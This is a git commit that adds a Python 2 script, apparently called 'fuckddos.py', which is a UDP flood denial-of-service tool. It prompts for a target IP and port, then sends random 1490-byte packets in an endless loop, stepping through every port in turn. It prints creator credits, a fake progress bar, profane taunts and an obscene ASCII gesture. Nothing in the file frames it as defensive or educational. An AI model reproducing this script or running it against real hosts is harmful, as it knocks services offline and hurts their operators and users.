63c2ecc5a656ebb6038b07c49af0e5c210c5f2c8
bac123hub <56878379+bac123hub@users.noreply.github.com>
2019-12-18 16:50:13 +0700

    Add files via upload

---
+++ fuckddos.py
@@ -0,0 +1,66 @@
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet DDos Attack")
+print
+print "Creator   : BTANONOPS ITSEC"
+print "You Tube : DON'T HAVE"
+print "github   : https://github.com/bac123hub"
+print "Facebook : https://www.facebook.com/bactrananonymous"
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print "[                    ] 0% "
+time.sleep(1)
+print "[=====               ] 25%"
+time.sleep(1)
+print "[==========          ] 50%"
+time.sleep(1)
+print "[===============     ] 75%"
+time.sleep(1)
+print "[====================] 100%"
+time.sleep(1)
+print "READY"
+time.sleep(3)
+print "STEADY"
+time.sleep(3)
+print "LET'S FUCK"
+time.sleep(1)
+print "                      /´¯¯/"
+print "                     /¯.../"
+print "                    /..../"
+print "               /´¯/'..'/´¯¯`·¸"
+print "            /'/.../..../....../¨¯\"
+print "          ('(....´...´... ¯~/'..')"
+print "           \..............'...../"
+print "            \....\.........._.·´"
+print "             \..............("
+print "              \..............\"
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
